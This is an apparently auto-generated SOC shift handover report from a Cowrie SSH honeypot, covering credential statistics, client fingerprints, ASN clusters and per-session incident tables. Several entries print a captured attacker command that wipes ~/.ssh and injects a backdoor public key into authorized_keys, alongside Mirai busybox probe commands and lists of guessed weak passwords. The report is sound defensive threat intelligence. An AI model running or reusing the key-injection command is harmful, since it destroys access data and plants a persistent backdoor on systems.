# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-25 |
| **Generated At** | 2026-10-25T15:15:21Z |
| **Shift Time** | 15:15 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **623** |
| Confirmed Threats | **521** |
| False Positives Filtered | **102** (16.4%) |
| Unique Attacker IPs | **320** |
| Countries of Origin | **49** |
| High Severity Cases | **367** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **256** |
| Malware Samples Analyzed | **8** HIGH · **26** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2645** |
| Unique Credential Pairs | **2013** |
| Unique Usernames | **876** |
| Unique Passwords | **1515** |
| Successful Auth Pairs | **2430** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 864 |
| `345gs5662d34` | 157 |
| `ubuntu` | 115 |
| `admin` | 92 |
| `support` | 47 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 157 |
| `3245gs5662d34` | 157 |
| `123456` | 92 |
| `123` | 44 |
| `support` | 39 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 157 |
| `root` | `3245gs5662d34` | 135 |
| `support` | `support` | 39 |
| `admin` | `` | 24 |
| `admin` | `admin` | 15 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `12345678` | `109.160.32.162` | 2026-10-25T00:55:04 |
| `openvpn` | `openvpn` | `109.160.32.162` | 2026-10-25T00:55:09 |
| `root` | `1234ab` | `109.160.32.162` | 2026-10-25T00:55:15 |
| `root` | `2004` | `109.160.32.162` | 2026-10-25T00:55:20 |
| `aishani` | `aishani@123` | `109.160.32.162` | 2026-10-25T00:55:26 |
| `admin` | `123321` | `109.160.32.162` | 2026-10-25T00:55:31 |
| `root` | `redhat123` | `109.160.32.162` | 2026-10-25T00:55:35 |
| `guest` | `123456` | `109.160.32.162` | 2026-10-25T00:55:40 |
| `user` | `blackinclub!@` | `109.160.32.162` | 2026-10-25T00:55:44 |
| `redmine` | `admin123!@` | `109.160.32.162` | 2026-10-25T00:55:49 |
| `admin1` | `admin1` | `109.160.32.162` | 2026-10-25T00:55:54 |
| `park` | `park` | `109.160.32.162` | 2026-10-25T00:55:59 |
| `ubuntu` | `123321` | `109.160.32.162` | 2026-10-25T00:56:04 |
| `ansible` | `ansible` | `109.160.32.162` | 2026-10-25T00:56:09 |
| `chris` | `chris` | `179.43.153.2` | 2026-10-25T00:56:14 |
| `user` | `123123` | `109.160.32.162` | 2026-10-25T00:56:15 |
| `vps` | `vps` | `109.160.32.162` | 2026-10-25T00:56:19 |
| `root` | `147963` | `109.160.32.162` | 2026-10-25T00:56:24 |
| `backup` | `backup` | `109.160.32.162` | 2026-10-25T00:56:32 |
| `tester` | `tester` | `109.160.32.162` | 2026-10-25T00:56:38 |
_… 2410 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **623** |
| Sessions with Fingerprint | **29** |
| Unique HASSH Fingerprints | **29** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 250 |
| Go SSH scanner | 131 |
| OpenSSH | 11 |
| Paramiko (Python) | 7 |
| PuTTY | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 206 | 108 |
| `2ec37a7cc8da...` | Mirai/variant | 80 | 3 |
| `16443846184e...` | Generic scanner | 17 | 6 |
| `03a80b21afa8...` | Modern SSH client | 12 | 7 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 206 | 108 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 80 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 19 | 12 | — |
| `16443846184e...` | Go SSH scanner | 17 | 6 | Generic scanner |
| `03a80b21afa8...` | libssh | 12 | 7 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 8 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 8 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **97** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 104 | 101 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `176.65.149.4`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `109.94.173.6`, `103.190.7.203`, `114.130.85.36`, `43.156.136.47`, `62.238.102.121`, `43.156.124.237`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **320** |
| Unique ASNs | **142** |
| High-Risk ASNs | **101** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 86 | HIGH |
| `AS396982` | Google LLC | 12 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 12 | HIGH |
| `AS4134` | CHINANET BACKBONE | 11 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 8 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (360)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-de2ee52fcb8b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]162` |
| **First Seen** | 2026-10-25 00:55 |
| **Last Seen** | 2026-10-25 00:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:55:03` | `cowrie.client.version` |
| `2026-10-25 00:55:03` | `cowrie.client.kex` |
| `2026-10-25 00:55:04` | `cowrie.login.success` |
| `2026-10-25 00:55:07` | `cowrie.session.params` |
| `2026-10-25 00:55:07` | `cowrie.command.input` |
| `2026-10-25 00:55:07` | `cowrie.log.closed` |
| `2026-10-25 00:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]162` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f013a140ae0b

| Field | Detail |
|---|---|
| **Source IP** | `179.43.153[.]2` |
| **First Seen** | 2026-10-25 00:56 |
| **Last Seen** | 2026-10-25 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:56:13` | `cowrie.session.connect` |
| `2026-10-25 00:56:13` | `cowrie.client.version` |
| `2026-10-25 00:56:13` | `cowrie.client.kex` |
| `2026-10-25 00:56:14` | `cowrie.login.success` |
| `2026-10-25 00:56:15` | `cowrie.session.params` |
| `2026-10-25 00:56:15` | `cowrie.command.input` |
| `2026-10-25 00:56:15` | `cowrie.log.closed` |
| `2026-10-25 00:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.43.153[.]2` to AbuseIPDB if not already reported
- [ ] Block `179.43.153[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e489f04631

| Field | Detail |
|---|---|
| **Source IP** | `43.157.243[.]165` |
| **First Seen** | 2026-10-25 01:00 |
| **Last Seen** | 2026-10-25 01:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:00:35` | `cowrie.session.connect` |
| `2026-10-25 01:00:35` | `cowrie.client.version` |
| `2026-10-25 01:00:35` | `cowrie.client.kex` |
| `2026-10-25 01:00:36` | `cowrie.login.success` |
| `2026-10-25 01:00:37` | `cowrie.session.params` |
| `2026-10-25 01:00:37` | `cowrie.command.input` |
| `2026-10-25 01:00:37` | `cowrie.command.failed` |
| `2026-10-25 01:00:38` | `cowrie.log.closed` |
| `2026-10-25 01:00:39` | `cowrie.session.params` |
| `2026-10-25 01:00:39` | `cowrie.command.input` |
| `2026-10-25 01:00:40` | `cowrie.session.file_download` |
| `2026-10-25 01:00:40` | `cowrie.log.closed` |
| `2026-10-25 01:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.243[.]165` to AbuseIPDB if not already reported
- [ ] Block `43.157.243[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d86bfb6def4

| Field | Detail |
|---|---|
| **Source IP** | `111.231.60[.]55` |
| **First Seen** | 2026-10-25 01:00 |
| **Last Seen** | 2026-10-25 01:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:00:36` | `cowrie.session.connect` |
| `2026-10-25 01:00:36` | `cowrie.client.version` |
| `2026-10-25 01:00:36` | `cowrie.client.kex` |
| `2026-10-25 01:00:37` | `cowrie.login.success` |
| `2026-10-25 01:00:38` | `cowrie.session.params` |
| `2026-10-25 01:00:38` | `cowrie.command.input` |
| `2026-10-25 01:00:38` | `cowrie.command.failed` |
| `2026-10-25 01:00:39` | `cowrie.log.closed` |
| `2026-10-25 01:00:40` | `cowrie.session.params` |
| `2026-10-25 01:00:40` | `cowrie.command.input` |
| `2026-10-25 01:00:40` | `cowrie.session.file_download` |
| `2026-10-25 01:00:40` | `cowrie.log.closed` |
| `2026-10-25 01:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.231.60[.]55` to AbuseIPDB if not already reported
- [ ] Block `111.231.60[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efac30b7be9

| Field | Detail |
|---|---|
| **Source IP** | `43.157.243[.]165` |
| **First Seen** | 2026-10-25 01:00 |
| **Last Seen** | 2026-10-25 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:00:40` | `cowrie.session.connect` |
| `2026-10-25 01:00:40` | `cowrie.client.version` |
| `2026-10-25 01:00:40` | `cowrie.client.kex` |
| `2026-10-25 01:00:41` | `cowrie.login.success` |
| `2026-10-25 01:00:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.243[.]165` to AbuseIPDB if not already reported
- [ ] Block `43.157.243[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c16a87360cb

| Field | Detail |
|---|---|
| **Source IP** | `111.231.60[.]55` |
| **First Seen** | 2026-10-25 01:00 |
| **Last Seen** | 2026-10-25 01:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:00:40` | `cowrie.session.connect` |
| `2026-10-25 01:00:40` | `cowrie.client.version` |
| `2026-10-25 01:00:41` | `cowrie.client.kex` |
| `2026-10-25 01:00:42` | `cowrie.login.success` |
| `2026-10-25 01:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.231.60[.]55` to AbuseIPDB if not already reported
- [ ] Block `111.231.60[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2513c56cf72

| Field | Detail |
|---|---|
| **Source IP** | `223.15.228[.]240` |
| **First Seen** | 2026-10-25 01:01 |
| **Last Seen** | 2026-10-25 01:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:01:04` | `cowrie.session.connect` |
| `2026-10-25 01:01:04` | `cowrie.client.version` |
| `2026-10-25 01:01:04` | `cowrie.client.kex` |
| `2026-10-25 01:01:05` | `cowrie.login.success` |
| `2026-10-25 01:01:06` | `cowrie.session.params` |
| `2026-10-25 01:01:06` | `cowrie.command.input` |
| `2026-10-25 01:01:06` | `cowrie.command.failed` |
| `2026-10-25 01:01:06` | `cowrie.log.closed` |
| `2026-10-25 01:01:07` | `cowrie.session.params` |
| `2026-10-25 01:01:07` | `cowrie.command.input` |
| `2026-10-25 01:01:07` | `cowrie.session.file_download` |
| `2026-10-25 01:01:07` | `cowrie.log.closed` |
| `2026-10-25 01:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.15.228[.]240` to AbuseIPDB if not already reported
- [ ] Block `223.15.228[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e6b89330150

| Field | Detail |
|---|---|
| **Source IP** | `223.15.228[.]240` |
| **First Seen** | 2026-10-25 01:01 |
| **Last Seen** | 2026-10-25 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:01:08` | `cowrie.session.connect` |
| `2026-10-25 01:01:08` | `cowrie.client.version` |
| `2026-10-25 01:01:08` | `cowrie.client.kex` |
| `2026-10-25 01:01:09` | `cowrie.login.success` |
| `2026-10-25 01:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.15.228[.]240` to AbuseIPDB if not already reported
- [ ] Block `223.15.228[.]240` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505a3e0f4ed1

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-10-25 01:01 |
| **Last Seen** | 2026-10-25 01:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:01:12` | `cowrie.session.connect` |
| `2026-10-25 01:01:12` | `cowrie.client.version` |
| `2026-10-25 01:01:12` | `cowrie.client.kex` |
| `2026-10-25 01:01:14` | `cowrie.login.success` |
| `2026-10-25 01:01:15` | `cowrie.session.params` |
| `2026-10-25 01:01:15` | `cowrie.command.input` |
| `2026-10-25 01:01:15` | `cowrie.command.failed` |
| `2026-10-25 01:01:15` | `cowrie.log.closed` |
| `2026-10-25 01:01:16` | `cowrie.session.params` |
| `2026-10-25 01:01:16` | `cowrie.command.input` |
| `2026-10-25 01:01:17` | `cowrie.session.file_download` |
| `2026-10-25 01:01:17` | `cowrie.log.closed` |
| `2026-10-25 01:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebedaa2cadb0

| Field | Detail |
|---|---|
| **Source IP** | `101.96.195[.]62` |
| **First Seen** | 2026-10-25 01:01 |
| **Last Seen** | 2026-10-25 01:01 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:01:15` | `cowrie.session.connect` |
| `2026-10-25 01:01:16` | `cowrie.client.version` |
| `2026-10-25 01:01:16` | `cowrie.client.kex` |
| `2026-10-25 01:01:18` | `cowrie.login.success` |
| `2026-10-25 01:01:19` | `cowrie.session.params` |
| `2026-10-25 01:01:19` | `cowrie.command.input` |
| `2026-10-25 01:01:19` | `cowrie.command.failed` |
| `2026-10-25 01:01:19` | `cowrie.log.closed` |
| `2026-10-25 01:01:20` | `cowrie.session.params` |
| `2026-10-25 01:01:20` | `cowrie.command.input` |
| `2026-10-25 01:01:20` | `cowrie.session.file_download` |
| `2026-10-25 01:01:20` | `cowrie.log.closed` |
| `2026-10-25 01:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.195[.]62` to AbuseIPDB if not already reported
- [ ] Block `101.96.195[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-108b476626bb

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-10-25 01:01 |
| **Last Seen** | 2026-10-25 01:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:01:17` | `cowrie.session.connect` |
| `2026-10-25 01:01:17` | `cowrie.client.version` |
| `2026-10-25 01:01:17` | `cowrie.client.kex` |
| `2026-10-25 01:01:19` | `cowrie.login.success` |
| `2026-10-25 01:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1cbaf81809b

| Field | Detail |
|---|---|
| **Source IP** | `101.96.195[.]62` |
| **First Seen** | 2026-10-25 01:01 |
| **Last Seen** | 2026-10-25 01:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:01:21` | `cowrie.session.connect` |
| `2026-10-25 01:01:22` | `cowrie.client.version` |
| `2026-10-25 01:01:22` | `cowrie.client.kex` |
| `2026-10-25 01:01:23` | `cowrie.login.success` |
| `2026-10-25 01:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.195[.]62` to AbuseIPDB if not already reported
- [ ] Block `101.96.195[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174242d976ee

| Field | Detail |
|---|---|
| **Source IP** | `43.156.124[.]237` |
| **First Seen** | 2026-10-25 01:02 |
| **Last Seen** | 2026-10-25 01:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:02:48` | `cowrie.session.connect` |
| `2026-10-25 01:02:48` | `cowrie.client.version` |
| `2026-10-25 01:02:49` | `cowrie.client.kex` |
| `2026-10-25 01:02:50` | `cowrie.login.success` |
| `2026-10-25 01:02:51` | `cowrie.session.params` |
| `2026-10-25 01:02:51` | `cowrie.command.input` |
| `2026-10-25 01:02:51` | `cowrie.command.failed` |
| `2026-10-25 01:02:52` | `cowrie.log.closed` |
| `2026-10-25 01:02:52` | `cowrie.session.params` |
| `2026-10-25 01:02:53` | `cowrie.command.input` |
| `2026-10-25 01:02:53` | `cowrie.session.file_download` |
| `2026-10-25 01:02:53` | `cowrie.log.closed` |
| `2026-10-25 01:02:57` | `cowrie.session.closed` |
